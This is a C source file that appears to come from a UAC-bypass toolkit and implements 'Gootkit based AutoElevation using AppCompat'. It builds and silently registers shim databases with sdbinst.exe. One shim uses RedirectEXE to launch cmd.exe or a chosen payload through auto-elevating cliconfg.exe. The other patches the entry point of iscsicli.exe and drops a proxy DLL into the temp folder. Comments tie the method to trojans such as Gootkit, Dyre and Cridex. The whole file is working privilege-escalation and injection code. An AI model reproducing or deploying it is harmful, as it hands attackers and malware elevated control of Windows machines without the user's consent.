/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2016,
*  (C) Original idea (?) mzH,
*  (C) MS FixIT Shim Patches revealed by Jon Erickson
**
*  TITLE:       GOOTKIT.C
*
*  VERSION:     2.00
*
*  DATE:        16 Nov 2015
*
*  Gootkit based AutoElevation using AppCompat.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "apphelp.h"
#include "inazuma32.h"

HMODULE hAppHelp;

pfnSdbCreateDatabase       SdbCreateDatabase;
pfnSdbWriteDWORDTag        SdbWriteDWORDTag;
pfnSdbWriteStringTag       SdbWriteStringTag;
pfnSdbWriteBinaryTag       SdbWriteBinaryTag;
pfnSdbEndWriteListTag      SdbEndWriteListTag;
pfnSdbBeginWriteListTag    SdbBeginWriteListTag;
pfnSdbCloseDatabaseWrite   SdbCloseDatabaseWrite;
pfnSdbStartIndexing        SdbStartIndexing;
pfnSdbStopIndexing         SdbStopIndexing;
pfnSdbCommitIndexes        SdbCommitIndexes;
pfnSdbDeclareIndex         SdbDeclareIndex;

static const WCHAR	SHIMPATCH_BINARYNAME[] = L"binarypatch01";
static const WCHAR	SHIMPATCH_EXENAME[] = L"iscsicli.exe";
static const WCHAR  SHIMPATCH_MSFTFULL[] = L"Microsoft Corporation";
static const WCHAR  SHIM_SDBINSTALLER[] = L"%ws\\sdbinst.exe";

/*
* ucmInitAppHelp
*
* Purpose:
*
* Initialize AppHelp routines.
*
*/
BOOL ucmInitAppHelp(
	VOID
	)
{
	BOOL bResult = FALSE;
	BOOL cond = FALSE;

	do {
		SdbCreateDatabase = (pfnSdbCreateDatabase)GetProcAddress(hAppHelp, "SdbCreateDatabase");
		if (SdbCreateDatabase == NULL) {
			break;
		}

		SdbBeginWriteListTag = (pfnSdbBeginWriteListTag)GetProcAddress(hAppHelp, "SdbBeginWriteListTag");
		if (SdbBeginWriteListTag == NULL) {
			break;
		}

		SdbEndWriteListTag = (pfnSdbEndWriteListTag)GetProcAddress(hAppHelp, "SdbEndWriteListTag");
		if (SdbEndWriteListTag == NULL) {
			break;
		}

		SdbWriteStringTag = (pfnSdbWriteStringTag)GetProcAddress(hAppHelp, "SdbWriteStringTag");
		if (SdbWriteStringTag == NULL) {
			break;
		}

		SdbCloseDatabaseWrite = (pfnSdbCloseDatabaseWrite)GetProcAddress(hAppHelp, "SdbCloseDatabaseWrite");
		if (SdbCloseDatabaseWrite == NULL) {
			break;
		}

		SdbWriteBinaryTag = (pfnSdbWriteBinaryTag)GetProcAddress(hAppHelp, "SdbWriteBinaryTag");
		if (SdbWriteBinaryTag == NULL) {
			break;
		}

		SdbWriteDWORDTag = (pfnSdbWriteDWORDTag)GetProcAddress(hAppHelp, "SdbWriteDWORDTag");
		if (SdbWriteDWORDTag == NULL) {
			break;
		}

		SdbDeclareIndex = (pfnSdbDeclareIndex)GetProcAddress(hAppHelp, "SdbDeclareIndex");
		if (SdbDeclareIndex == NULL) {
			break;
		}

		SdbStartIndexing = (pfnSdbStartIndexing)GetProcAddress(hAppHelp, "SdbStartIndexing");
		if (SdbStartIndexing == NULL) {
			break;
		}

		SdbStopIndexing = (pfnSdbStopIndexing)GetProcAddress(hAppHelp, "SdbStopIndexing");
		if (SdbStopIndexing == NULL) {
			break;
		}

		SdbCommitIndexes = (pfnSdbCommitIndexes)GetProcAddress(hAppHelp, "SdbCommitIndexes");
		if (SdbCommitIndexes == NULL) {
			break;
		}

		bResult = TRUE;

	} while (cond);

	return bResult;
}

/*
* ucmRegisterAndRunTarget
*
* Purpose:
*
* Register shim database and execute target app.
*
*/
BOOL ucmRegisterAndRunTarget(
	_In_ LPWSTR lpSystemDirectory,
	_In_ LPWSTR lpSdbinstPath,
	_In_ LPWSTR lpShimDbPath,
	_In_ LPWSTR lpTarget,
	_In_ BOOL IsPatch
	)
{
	BOOL bResult = FALSE;
	WCHAR szTempDirectory[MAX_PATH * 2];
	WCHAR szCmd[MAX_PATH * 4];

	if ((lpTarget == NULL) ||
		(lpSystemDirectory == NULL)  ||
		(lpSdbinstPath == NULL) ||
		(lpShimDbPath == NULL)
		)
	{
		return bResult;
	}

	RtlSecureZeroMemory(szCmd, sizeof(szCmd));
	if (IsPatch) {
		wsprintf(szCmd, L"-p %ws", lpShimDbPath);
	}
	else {
		_strcpy_w(szCmd, lpShimDbPath);
	}

	//register shim, sdbinst.exe
	if (supRunProcess(lpSdbinstPath, szCmd)) {
		RtlSecureZeroMemory(szTempDirectory, sizeof(szTempDirectory));
		wsprintfW(szTempDirectory, lpTarget, lpSystemDirectory);
		bResult = supRunProcess(szTempDirectory, NULL);

		//remove database
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintf(szCmd, L"/q /u %ws", lpShimDbPath);
		supRunProcess(lpSdbinstPath, szCmd);
		DeleteFileW(lpShimDbPath);
	}
	return bResult;
}

/*
* ucmShimRedirectEXE
*
* Purpose:
*
* Build, register shim database and execute target app.
* Initially used in BlackEnergy2 and Gootkit by mzH (alive-green).
* Currently used in number of trojans (Win32/Dyre, WinNT/Cridex).
*
*/
BOOL ucmShimRedirectEXE(
	LPWSTR lpszPayloadEXE
	)
{
	BOOL bResult = FALSE;
	PDB hShimDb;
	GUID dbGUID, exeGUID;
	WCHAR szTempDirectory[MAX_PATH * 2];
	WCHAR szShimDbPath[MAX_PATH * 2];
	WCHAR szSdbinstPath[MAX_PATH * 2];
	WCHAR szSystemDirectory[MAX_PATH];

	TAGID tidDB = 0;
	TAGID tidEXE = 0;
	TAGID tidMatchFile = 0;
	TAGID tidShim = 0;
	TAGID tidLib = 0;

	if (lpszPayloadEXE == NULL) {
		return bResult;
	}

	RtlSecureZeroMemory(szSdbinstPath, sizeof(szSdbinstPath));
	RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));

	if (!GetSystemDirectoryW(szSystemDirectory, MAX_PATH)) {
		return bResult;
	}
	wsprintfW(szSdbinstPath, SHIM_SDBINSTALLER, szSystemDirectory);

	//
	// GUIDs are important, for both DATABASE and EXE file.
	// They used as shim identifiers and must to be set.
	//
	if (CoCreateGuid(&dbGUID) != S_OK) {
		return bResult;
	}
	if (CoCreateGuid(&exeGUID) != S_OK) {
		return bResult;
	}

	RtlSecureZeroMemory(szTempDirectory, sizeof(szTempDirectory));
	RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));

	if (!GetTempPathW(MAX_PATH, szTempDirectory)) {
		return bResult;
	}

	wsprintfW(szShimDbPath, L"%wspe386.sdb", szTempDirectory);

	hShimDb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
	if (hShimDb == NULL) {
		return bResult;
	}

	//write shim DB header
	tidDB = SdbBeginWriteListTag(hShimDb, TAG_DATABASE);
	if (tidDB != TAGID_NULL) {

		SdbWriteStringTag(hShimDb, TAG_NAME, L"pe386");
		SdbWriteDWORDTag(hShimDb, TAG_OS_PLATFORM, 0x1); //win32 only RedirectEXE
		SdbWriteBinaryTag(hShimDb, TAG_DATABASE_ID, (PBYTE)&dbGUID, sizeof(GUID));

		//just as ACT 5.6 does
		tidLib = SdbBeginWriteListTag(hShimDb, TAG_LIBRARY);
		if (tidLib != TAGID_NULL) SdbEndWriteListTag(hShimDb, tidLib);

		//write shim task information
		tidEXE = SdbBeginWriteListTag(hShimDb, TAG_EXE);
		if (tidEXE != TAGID_NULL) {
			SdbWriteStringTag(hShimDb, TAG_NAME, L"cliconfg.exe");
			SdbWriteStringTag(hShimDb, TAG_APP_NAME, L"cliconfg.exe");
			SdbWriteStringTag(hShimDb, TAG_VENDOR, L"Microsoft");
			SdbWriteBinaryTag(hShimDb, TAG_EXE_ID, (PBYTE)&exeGUID, sizeof(GUID));

			//write shim target info
			tidMatchFile = SdbBeginWriteListTag(hShimDb, TAG_MATCHING_FILE);
			if (tidMatchFile != TAGID_NULL) {
				SdbWriteStringTag(hShimDb, TAG_NAME, L"*"); //<-from any
				SdbWriteStringTag(hShimDb, TAG_COMPANY_NAME, SHIMPATCH_MSFTFULL);
				SdbWriteStringTag(hShimDb, TAG_INTERNAL_NAME, L"cliconfg.exe");
				SdbEndWriteListTag(hShimDb, tidMatchFile);
			}

			//write shim action info
			tidShim = SdbBeginWriteListTag(hShimDb, TAG_SHIM_REF);
			if (tidShim != TAGID_NULL) {
				SdbWriteStringTag(hShimDb, TAG_NAME, L"RedirectEXE");
				SdbWriteStringTag(hShimDb, TAG_COMMAND_LINE, lpszPayloadEXE);
				SdbEndWriteListTag(hShimDb, tidShim);
			}
			SdbEndWriteListTag(hShimDb, tidEXE);
		}
		SdbEndWriteListTag(hShimDb, tidDB);
	}
	SdbCloseDatabaseWrite(hShimDb);

	bResult = ucmRegisterAndRunTarget(szSystemDirectory, szSdbinstPath, szShimDbPath, L"%ws\\cliconfg.exe", FALSE);
	return bResult;
}

/*
* ucmShimPatch
*
* Purpose:
*
* Build, register shim patch database and execute target app with forced Entry Point Override.
* Aside from UAC bypass this is also dll injection technique.
*
*/
BOOL ucmShimPatch(
	CONST PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	PDB	 hpdb;
	GUID dbGUID, exeGUID;
	
	WCHAR szTempDirectory[MAX_PATH * 2];
	WCHAR szShimDbPath[MAX_PATH * 2];
	WCHAR szSdbinstPath[MAX_PATH * 2];
	WCHAR szSystemDirectory[MAX_PATH];

	DWORD		indexid = MAXDWORD, sz, epRVA = 0;
	TAGID		dbrf, libref, patchref, exeref, matchfileref, patchfileref;
	PBYTE		tmp;
	PPATCHBITS	patchbits;

	RtlSecureZeroMemory(szSdbinstPath, sizeof(szSdbinstPath));
	RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));

	do {

		if (!GetSystemDirectoryW(szSystemDirectory, MAX_PATH)) {
			break;
		}
		wsprintfW(szSdbinstPath, SHIM_SDBINSTALLER, szSystemDirectory);

		if (CoCreateGuid(&dbGUID) != S_OK) {
			break;
		}
		if (CoCreateGuid(&exeGUID) != S_OK) {
			break;
		}

		RtlSecureZeroMemory(szTempDirectory, sizeof(szTempDirectory));

		if (!GetTempPathW(MAX_PATH, szTempDirectory)) {
			break;
		}

		// drop Fubuki
		RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
		wsprintfW(szShimDbPath, L"%wsr3.dll", szTempDirectory);
		if (!supWriteBufferToFile(szShimDbPath, ProxyDll, ProxyDllSize))
		{
			break;
		}

		RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));

		wsprintfW(szShimDbPath, L"%wsamuzani.sdb", szTempDirectory);

		hpdb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
		if (hpdb == NULL) {
			break;
		}

		if (!SdbDeclareIndex(hpdb, TAG_EXE, TAG_NAME, 1, TRUE, &indexid)) {
			break;
		}
		if (!SdbStartIndexing(hpdb, indexid)) {
			break;
		}
		SdbStopIndexing(hpdb, indexid);
		SdbCommitIndexes(hpdb);

		// begin DATABASE {
		dbrf = SdbBeginWriteListTag(hpdb, TAG_DATABASE);		
		if (!SdbWriteStringTag(hpdb, TAG_NAME, L"amuzani")) {
			break;
		}
		SdbWriteBinaryTag(hpdb, TAG_DATABASE_ID, (PBYTE)&dbGUID, sizeof(GUID));
		SdbWriteDWORDTag(hpdb, TAG_OS_PLATFORM, 0x1); //<- win32

		// begin LIBRARY {
		libref = SdbBeginWriteListTag(hpdb, TAG_LIBRARY);

		patchref = SdbBeginWriteListTag(hpdb, TAG_PATCH); // begin LIBRARY-PATCH
		SdbWriteStringTag(hpdb, TAG_NAME, SHIMPATCH_BINARYNAME);

		// query EP RVA for target
		RtlSecureZeroMemory(szTempDirectory, sizeof(szTempDirectory));
		wsprintfW(szTempDirectory, L"%ws\\%ws", szSystemDirectory, SHIMPATCH_EXENAME);
		epRVA = supQueryEntryPointRVA(szTempDirectory);
		if (epRVA == 0) {
			break;
		}

		tmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 32 * 1024);
		if (tmp != NULL) {
			patchbits = (PPATCHBITS)tmp;
			sz = 0;
			patchbits->Opcode = PATCH_REPLACE;
			patchbits->RVA = epRVA;
			_strcpy_w(patchbits->ModuleName, SHIMPATCH_EXENAME);
			supCopyMemory((char *)&patchbits->Pattern, sizeof(patchcode32), patchcode32, sizeof(patchcode32));
			patchbits->PatternSize = sizeof(patchcode32);
			patchbits->ActionSize = sizeof(PATCHBITS) + patchbits->PatternSize;
			sz += patchbits->ActionSize;
			SdbWriteBinaryTag(hpdb, TAG_PATCH_BITS, tmp, sz);
			HeapFree(GetProcessHeap(), 0, tmp);
		}
		SdbEndWriteListTag(hpdb, patchref); // end LIBRARY-PATCH

		// end LIBRARY
		SdbEndWriteListTag(hpdb, libref);

		SdbStartIndexing(hpdb, indexid);

		// begin EXE {
		exeref = SdbBeginWriteListTag(hpdb, TAG_EXE);
		SdbWriteStringTag(hpdb, TAG_NAME, SHIMPATCH_EXENAME);
		SdbWriteStringTag(hpdb, TAG_APP_NAME, SHIMPATCH_EXENAME);
		SdbWriteBinaryTag(hpdb, TAG_EXE_ID, (PBYTE)&exeGUID, sizeof(GUID));

		// begin MATCH {
		matchfileref = SdbBeginWriteListTag(hpdb, TAG_MATCHING_FILE);
		SdbWriteStringTag(hpdb, TAG_NAME, SHIMPATCH_EXENAME);
		SdbWriteStringTag(hpdb, TAG_COMPANY_NAME, SHIMPATCH_MSFTFULL);
		SdbEndWriteListTag(hpdb, matchfileref); // } end MATCH

		patchfileref = SdbBeginWriteListTag(hpdb, TAG_PATCH_REF);
		SdbWriteStringTag(hpdb, TAG_NAME, SHIMPATCH_BINARYNAME);
		SdbWriteDWORDTag(hpdb, TAG_PATCH_TAGID, patchref);
		SdbEndWriteListTag(hpdb, patchfileref);

		SdbEndWriteListTag(hpdb, exeref); // } end EXE

		// } end DATABASE
		SdbEndWriteListTag(hpdb, dbrf);

		SdbCloseDatabaseWrite(hpdb);

		// Register db and run target.
		bResult = ucmRegisterAndRunTarget(szSystemDirectory, szSdbinstPath, szShimDbPath, L"%ws\\iscsicli.exe", TRUE);

	} while (cond);

	return bResult;
}

/*
* ucmAppcompatElevation
*
* Purpose:
*
* AutoElevation using Application Compatibility engine.
*
*/
BOOL ucmAppcompatElevation(
	UACBYPASSMETHOD Method,
	CONST PVOID ProxyDll,
	DWORD ProxyDllSize,
	LPWSTR lpszPayloadEXE
	)
{
	BOOL cond = FALSE, bResult = FALSE;
	WCHAR szBuffer[MAX_PATH * 2];

	do {

		RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
		if (ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\apphelp.dll"),
			szBuffer, MAX_PATH) == 0)
		{
			break;
		}

		hAppHelp = LoadLibrary(szBuffer);
		if (hAppHelp == NULL) {
			break;
		}

		if (ucmInitAppHelp() == FALSE) {
			break;
		}

		//create and register shim with RedirectEXE, cmd.exe as payload
		if (Method == UacMethodRedirectExe) {

			if (lpszPayloadEXE == NULL) {
				_strcpy_w(szBuffer, L"%systemroot%\\system32\\cmd.exe");
				bResult = ucmShimRedirectEXE(szBuffer);
			}
			else {
				bResult = ucmShimRedirectEXE(lpszPayloadEXE);
			}
			return bResult;
		}  	
		//create and register shim patch with fubuki as payload
		if (Method == UacMethodShimPatch) {
			bResult = ucmShimPatch(ProxyDll, ProxyDllSize);
		}

	} while (cond);

	return bResult;
}
